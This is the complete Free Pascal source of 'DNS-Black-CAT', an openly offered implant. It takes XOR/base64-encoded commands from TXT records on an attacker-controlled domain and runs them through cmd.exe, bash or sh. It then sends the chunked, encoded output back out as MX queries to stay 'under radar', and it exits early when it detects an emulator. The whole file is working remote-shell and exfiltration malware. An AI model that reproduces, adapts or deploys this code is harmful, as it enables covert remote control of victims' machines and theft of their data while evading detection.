{

    


  ___  _  _ ___     ___ _      _   ___ _  __    ___   _ _____
 |   \| \| / __|___| _ ) |    /_\ / __| |/ /__ / __| /_\_   _|
 | |) | .` \__ \___| _ \ |__ / _ \ (__| ' <___| (__ / _ \| |
 |___/|_|\_|___/   |___/____/_/ \_\___|_|\_\   \___/_/ \_\_|




 * Source is provided to this software because we believe users have a     *
 * right to know exactly what a program is going to do before they run it. *
 * This also allows you to audit the software for future improvements.     *
 *                                                                         *
 * Source code also allows you to port DNS-Cat to new platforms, fix bugs  *
 * and add new features. You are highly encouraged to send your changes    *
 * to the admin@0xsp.com                                                   *
 *                                                                         *
 *                                                                         *
 *  This program is distributed in the hope that it will be useful,        *
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
 *                                                                         *
 *  #Author : Lawrence Amer   @zux0x3a
 *  #LINKS : https://0xsp.com
 *                                                                         *
}


program project1;

{$mode delphi}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,
  {$IFDEF Windows}
  windows,
  {$IFEND}
  CustApp,dnssend,process,base64;

type

  { TMyApplication }

  TDNSCAT = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure DNS; virtual;
    procedure TXTvalueQuery; virtual;
  end;

  var
    status : Boolean;
    i_host : string;

{ TMyApplication }

procedure TDNSCAT.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h', 'host');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'host') then begin

    DNS;

  end;

  { add your program here }
    if ParamCount < 1 then begin

      writehelp;

    end;
  // stop program loop
  Terminate;
end;

constructor TDNSCAT.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor TDNSCAT.Destroy;
begin
  inherited Destroy;
end;

{$IFDEF Windows}   // check env if windows only
function SystemFolder: string;
begin
  SetLength(Result, Windows.MAX_PATH);
  SetLength(
    Result, Windows.GetSystemDirectory(PChar(Result), Windows.MAX_PATH)
  );
end;
{$IFEND}


{$IFDEF Windows}
function isEmulated :boolean;
var
  mem : intptr;
begin
 mem := dword64(VirtualAllocExNuma(GetCurrentProcess(),0,$1000,$3000,$20,0));

 if mem = 0 then
 result := true
 else
  result := false

end;
{$IFEND}
function traffic_Seg(const data:string):string;   // send every chunk with separated request in order to be under radar
var
  tmp_list : Tstringlist;
  DNSd: TDNSsend;
begin
  DNSd := TDNSSend.Create;
  tmp_list := Tstringlist.create;
  try
  DNSd.TargetHost := i_host;
  DNSd.DNSQuery(data+'.'+i_host, QTYPE_MX, tmp_list);

  finally
    DNSd.Free;
  end;

end;

procedure TDNSCAT.TXTvalueQuery;
var
  l:tstringlist;
  DNSd: TDNSSend;
begin
  status := false;
  DNSd := TDNSSend.Create;
  l := Tstringlist.create;
  DNSd.TargetHost := i_host;
  sleep(1000);
  DNSd.DNSQuery('test.'+i_host, QTYPE_TXT, l);
  if length(l.text) > 0 then begin
    DNSd.DNSQuery('test.'+i_host, QTYPE_AAAA, l)
  end else
  status := true;
end;

// thanks to : https://forum.lazarus.freepascal.org/index.php?topic=33743.0
procedure XorCrypt(Var Buffer; Const Len: Cardinal; Const Key: String);
Var PB: ^Byte;
    I, II: Cardinal;
Begin
  PB:= @Buffer;
  II:= 1;
  For I:= 0 To Len - 1 Do Begin
    PB^:= PB^ Xor Byte(Key[II]);
    Inc(PB);
    Inc(II);
    If II > Length(Key) Then II:= 1;
  End;
End;

Function XorEncodeBase64(Const What, Key: String): String;
Var P: Pointer;
    L: Cardinal;
    M: TMemoryStream;
Begin
  //Uses Base64 for encoding
  L:= Length(What);
  GetMem(P, L);
  Try
    Move(What[1], P^, L);
    XorCrypt(P^, L, Key);    // xoring
    M:= TMemoryStream.Create;
    Try
      With TBase64EncodingStream.Create(M) Do Try
        Write(P^, L);
      Finally
        Free;
      End;
      SetString(Result, PAnsiChar(M.Memory), M.Size);
    Finally
      M.Free;
    End;
  Finally
    FreeMem(P);
  End;
End;

 Function XorDecodeBase64(Const What: String): String;
Var P: Pointer;
    L: Cardinal;
    M: TMemoryStream;
    key:string;
Begin
  //Uses Base64
  key := '0xsp.com';
  M:= TMemoryStream.Create;
  Try
    M.Write(What[1], Length(What));
    M.Position:= 0;
    GetMem(P, M.Size);
    Try
      With TBase64DecodingStream.Create(M) Do Try
        L:= Read(P^, M.Size);
        XorCrypt(P^, L, Key);
        SetString(Result, PAnsiChar(P), L);
      Finally
        Free;
      End;
    Finally
      FreeMem(P);
    End;
  Finally
    M.Free;
  End;
End;

function TestXorBase64(s:string):string;
Var  Key, B64: String;
Begin

  Key:= '0xsp.com'; //default password for xor encryption
  B64:= XorEncodeBase64(S, Key);
 result := B64;

End;

function exfiltrate(str:string):string;
var
  NumElem, i ,Len:Integer;
  Arr: array of String;
begin
     Len := Length(str);
    // Calculate how many full elements we need
    NumElem := Len div 30;
    // Handle the leftover content at the end
    if Len mod 10 <> 0 then
      Inc(NumElem);
      SetLength(Arr, NumElem);

    // Extract the characters from the string, 10 at a time, and
    // put into the array. We have to calculate the starting point
    // for the copy in the loop (the i * 30 + 1).
    for i := 0 to High(Arr) do
      Arr[i] := Copy(Str, i * 30 + 1, 30);

   // Send data into DNS server as Chunks
   for i := 0 to High(Arr) do begin


  traffic_Seg(TestXorBase64(Arr[i]));
  writeln('[+]Shell command results has been sent -> ');
end;

end;

procedure TDNSCAT.DNS;
var
  p2: tstringlist;
  str: string;
  DNSd: TDNSSend;
  y: Integer;

begin
    {$IFDEF Windows}
    if isemulated = true
    then
      exit
      else
     {$IFEND}

  for y := 1 to paramcount do begin
      if (paramstr(y)='-h') then begin
        i_host := paramstr(y+1);
      end;

  end;

  status := false;
  p2 := Tstringlist.Create;
  TXTvalueQuery;   // Query an active dns server for txt value to pass as valid command
  DNSd := TDNSSend.Create;
  DNSd.TargetHost := i_host;

  if DNSd.DNSQuery('live.'+i_host, QTYPE_TXT, p2) then
   writeln('[!] DNS Query Length: ',(length(p2.text))); // length of accepted DNS query
   if length(p2.text) > 1 then
  writeln('[+] Yo! Recieving Encrypted command [ '+p2.text+' ]');
   {$IFDEF Windows} // for windows env
  RunCommand(systemfolder+'\cmd.exe',['/c',XorDecodeBase64(p2.text)],str);
   {$IFEND}
   {$IFDEF linux}   //for Linux env
    RunCommand('/bin/bash',['-c',XorDecodeBase64(p2.text)],str);
   {$IFEND}
   {$IFDEF darwin}
    RunCommand('/bin/sh',['-c',XorDecodeBase64(p2.text)],str);
   {$IFEND}

  exfiltrate(str); // send command results into dns server

  status := true; // Bool value
 while status do begin    // loop case

     DNS

 end;

end;





procedure TDNSCAT.WriteHelp;
begin

  writeln('[!] DNS-Black-CAT Exfiltration Multi-platform Tool v1.1');
  writeln('[*] supports : Windows , Linux , Macos ..');
  writeln('by : @zux0x3a <> 0xsp.com ');
  writeln(' ');
  writeln('Usage: ', ExeName, ' -h DOMAIN_NAME');
end;

var
  Application: TDNSCAT;
begin
  Application:=TDNSCAT.Create(nil);
  Application.Title:='DNS-Black-Cat';
  Application.Run;
  Application.Free;
end.
